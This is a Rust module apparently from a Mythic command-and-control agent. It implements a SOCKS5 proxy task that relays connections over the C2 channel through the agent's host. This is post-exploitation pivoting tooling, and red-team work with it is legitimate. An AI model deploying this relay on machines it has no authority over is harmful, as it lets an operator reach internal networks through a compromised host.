use crate::agent::AgentTask;
use crate::mythic_error;
use crate::tasking::BackgroundTask;
use std::result::Result;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc;
use std::{error::Error, sync::Arc};
use tokio::{
    net::TcpStream,
    runtime::Runtime,
};
use tokio::io::{AsyncReadExt, AsyncWriteExt, AsyncWrite, split, WriteHalf, ReadHalf};
use tokio::task::JoinHandle;
use std::io::{self, ErrorKind};
use tokio::sync::Mutex;
use std::collections::HashMap;
use std::net::{Ipv4Addr, Ipv6Addr, IpAddr, SocketAddr, ToSocketAddrs};
use std::convert::TryInto;
use tokio::sync::mpsc::{Receiver, Sender};
use serde::{Deserialize, Serialize};

/// Struct for parsing the arguments of the `portfwd` command parameters
#[derive(Debug, Deserialize, Serialize)]
pub(crate) struct SocksMsg {
    exit: bool,
    server_id: usize,
    data: String,
}
#[derive(Deserialize)]
enum SocksArgs {
    Start,
    Stop
}

pub fn task_socks(
    task: &AgentTask,
    socks_from_backend: &mut Option<Sender<SocksMsg>>,
    socks_to_backend: &mut Option<Receiver<SocksMsg>>,
) -> Result<Option<BackgroundTask>, Box<dyn Error>> {
    match task.parameters.as_str()
    {
        "start" => {
            let (snd_from_mythic,recv_from_mythic) = tokio::sync::mpsc::channel(1024);
            let (snd_to_mythic,recv_for_mythic) = tokio::sync::mpsc::channel(1024);
            *socks_from_backend = Some(snd_from_mythic);
            *socks_to_backend = Some(recv_for_mythic);

            //
            let (tx, rx) = mpsc::channel();


            // Create a new flag indicating that the task is running
            let running = Arc::new(AtomicBool::new(true));
            let running_ref = running.clone();

            let uuid = task.id.clone();

            // Spawn a new thread for the background task
            std::thread::spawn(move || {
                // Invoke the callback function
                if let Err(e) = setup_socks(snd_to_mythic, recv_from_mythic) {
                    // If the function returns an error, relay the error message back to Mythic
                    let _ = tx.send(mythic_error!(uuid, e.to_string()));
                }
                // Once the task ends, mark it as not running
                running_ref.store(false, Ordering::SeqCst);
            });

            // Append this new task to the Vec of background tasks
            Ok(Some(BackgroundTask {
                command: "socks".into(),
                parameters: task.parameters.clone(),
                uuid: task.id.clone(),
                killable: true,
                id: 0,
                running,

                tx,
                rx,
            }))
        },
        "stop" => {
            *socks_from_backend = None;//Droping this will end the loop
            *socks_to_backend = None;
            Ok(None)
        }
        p => Err(format!("parameter {}", p).into())
    }
}

/// Runs a async socks server
pub fn setup_socks(
    snd_to_mythic: Sender<SocksMsg>,
    recv_from_mythic: Receiver<SocksMsg>,
) -> Result<(), Box<dyn Error>> {
    // Initialize a new async runtime
    let rt = Runtime::new()?;

    // Start the async runtime
    rt.block_on(async {
        let client_sockets: Arc<Mutex<HashMap<usize, Client>>> = Arc::new(Mutex::new(HashMap::new()));
        
        // Notify Mythic that the portfwd has started
        /*tx.send(mythic_continued!(
            task.id,
            "started socks",
            ""
        ))?;*/
        // Loop continuously until the exit flag is set
        loop {
            let msg = if let Some(msg) = recv_from_mythic.recv().await {
                msg
            }else{
                break;
            };
            let data = base64::decode(msg.data).expect("socks not base64");
            let id = msg.server_id;

            let op = if let Some(c) = client_sockets.lock().await.get_mut(&id){
                match c {
                    Client::Connecting(jh) => {
                        jh.abort();
                        Err(io::Error::new(ErrorKind::NotConnected,""))
                    },
                    Client::Connected(csock) => {
                        write_to_client(csock, &data).await
                    },
                }
            }else{
                //new client
                let jh = tokio::spawn(connect_request(id,
                    snd_to_mythic.clone(),
                    data,
                    client_sockets.clone()));
                client_sockets.lock().await.insert(id, Client::Connecting(jh));
                Ok(())
            };
            if let Err(_e) = op {
                //client error
                client_sockets.lock().await.remove(&id);
                write_mplx_data(id, true, &[0], &snd_to_mythic).await.unwrap();
            }
            if msg.exit {
                if let Some(c) = client_sockets.lock().await.remove(&id){
                    match c {
                        Client::Connecting(jh) => {
                            jh.abort();
                        },
                        Client::Connected(mut csock) => { //todo does this close reading too?
                            let _ = csock.shutdown().await;
                        },
                    }
                }                
            }
        }
        Ok(())
    })
}


async fn write_to_client<W: AsyncWrite+Unpin>(csock: &mut W, data: &[u8]) -> io::Result<()> {
    csock.write_all(data).await?;
    csock.flush().await?;
    Ok(())
}
async fn write_mplx_data(server_id: usize, exit: bool, data: &[u8], backend_w: &Sender<SocksMsg>) -> io::Result<()> {

    let args = SocksMsg {
        exit,
        server_id,
        data: base64::encode(data),
    };
    backend_w.send(args).await.map_err(|_|io::Error::new(io::ErrorKind::BrokenPipe, "backend closed"))?;
    Ok(())
}
enum Client {
    Connecting(JoinHandle<()>),
    Connected(WriteHalf<TcpStream>)
}
async fn connect_request(id: usize,
    backend_w: Sender<SocksMsg>,
    mut data: Vec<u8>,
    client_sockets: Arc<Mutex<HashMap<usize, Client>>>
) {
    match socks_connect(&data).await {
        Ok(client_stream) => {
            data[1]=0;
            write_mplx_data(id, false, &data, &backend_w).await.expect("link down");
            let (client_r, cwrite) = split(client_stream);
            
            client_sockets.lock().await.insert(id, Client::Connected(cwrite));

            read_from_client(id, client_r, &backend_w).await;
        }
        Err(socks_err_no) => {
            write_mplx_data(id, false, &[5, socks_err_no], &backend_w).await.expect("link down");
            write_mplx_data(id, true, &[0], &backend_w).await.expect("link down");
        }
    }
}
async fn socks_dns(data: &[u8]) -> io::Result<SocketAddr> {
    let len = data[0] as usize;
    if data.len() != len+3 {return Err(io::Error::new(
        ErrorKind::UnexpectedEof,
        "no valid name"
        ));}

    let portb : [u8;2] = data[len+1..].try_into().unwrap();

    /*
    println!("connect dns {:?}", //String::from_utf8_lossy(&data[..data.len()-2])
        std::str::from_utf8(&data[1..len+1])
    );*/

    (
        std::str::from_utf8(&data[1..len+1]).map_err(|_|{
            io::Error::new(ErrorKind::InvalidInput,"")
        })?,
        u16::from_be_bytes(portb)
    ).to_socket_addrs()?.next().ok_or(io::Error::new(ErrorKind::NotFound,""))
}
async fn socks_ipv6(data: &[u8]) -> io::Result<SocketAddr> {
    if data.len() < 18 {return Err(io::Error::new(
        ErrorKind::UnexpectedEof,
        "no IPv6"
        ));}
    
        let ipb : [u8;16] = data[0..16].try_into().unwrap();
        let portb : [u8;2] = data[16..18].try_into().unwrap();

        Ok(SocketAddr::new(IpAddr::V6(
            Ipv6Addr::from(ipb)),
            u16::from_be_bytes(portb)
        ))
}
async fn socks_ipv4(data: &[u8]) -> io::Result<SocketAddr> {
    if data.len() < 6 {return Err(io::Error::new(
    ErrorKind::UnexpectedEof,
    "no IPv4"
    ));}

    let ipb : [u8;4] = data[0..4].try_into().unwrap();
    let portb : [u8;2] = data[4..6].try_into().unwrap();

    Ok(SocketAddr::new(IpAddr::V4(
        Ipv4Addr::from(ipb)),
        u16::from_be_bytes(portb)
    ))
}
async fn socks_connect(data: &[u8]) -> Result<TcpStream, u8> {
    if data.len() < 4 {return Err(1);}
    if data[0]!=5 {return Err(1);}
    if data[2]!=0 {return Err(1);}
    
    let addr = match match data[3] {
        1 => socks_ipv4(&data[4..]).await,
        3 => socks_dns(&data[4..]).await,
        4 => socks_ipv6(&data[4..]).await,
        _ => {return Err(8);}
    }{
        Ok(sa) => sa,
        Err(_io_err) => return Err(1)
    };

    match data[1] {
        1 => { //TCP connect
            TcpStream::connect(addr).await.map_err(|op|{
                //eprintln!("{:?}",op);
                match op.kind() {
                    ErrorKind::ConnectionRefused => 5,
                    ErrorKind::ConnectionReset => 5,
                    ErrorKind::ConnectionAborted => 5,
                    _ => 1
                }
            })
        },
        2 => { //TCP bind
            //Two socks answeres
            //1. the bind addr
            //2. the connecting client
            Err(7)
        },
        _ => Err(7)
    }
}
async fn read_from_client(id:usize, mut client_r : ReadHalf<TcpStream>, backend_w: &Sender<SocksMsg>) {
    let mut buffer : [u8; 8192] = [0; 8192];
    loop {
        let n = match client_r.read(&mut buffer).await {
            Ok(0) => break,
            Ok(n) => n,
            Err(_e) => break
        };
        if let Err(_e) = write_mplx_data(id, false, &buffer[..n], backend_w).await {
            //backend gone -> close
            return;
        }
    }
    let _ = write_mplx_data(id, true, &[0], backend_w).await;
    //backend gone, but we are closing anyway
    
    //client_r.close();
}
